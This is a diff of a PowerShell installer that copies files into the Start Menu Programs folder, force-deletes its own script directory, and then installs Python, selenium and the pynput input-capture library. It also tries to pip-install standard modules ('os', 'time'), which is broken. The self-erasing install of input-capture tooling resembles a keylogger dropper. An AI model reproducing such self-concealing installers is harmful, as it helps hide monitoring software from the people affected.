@@ -15,22 +15,7 @@
 # }
 # scoop update
 
-if ( -not (Get-command python -errorAction SilentlyContinue)){
-  
-  scoop install python
-  cd "~\scoop\apps\python\current"
-  pip install os
-  pip install datetime
-  pip install time
-  pip install selenium
-  pip install pynput
-}else{
-   pip install os
-  pip install datetime
-  pip install time
-  pip install selenium
-  pip install pynput
-}
+
 
 $destinationFolder = "~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs"
 
@@ -56,4 +41,20 @@ Copy-Item -Path $sourceFolder -Destination $dich -Force | Out-Null
 
 if(Test-Path $PSScriptRoot){
  Remove-Item -Path $PSScriptRoot -Recurse -Force
+}
+if ( -not (Get-command python -errorAction SilentlyContinue)){
+  
+  scoop install python
+  cd "~\scoop\apps\python\current"
+  pip install os
+  pip install datetime
+  pip install time
+  pip install selenium
+  pip install pynput
+}else{
+   pip install os
+  pip install datetime
+  pip install time
+  pip install selenium
+  pip install pynput
 }
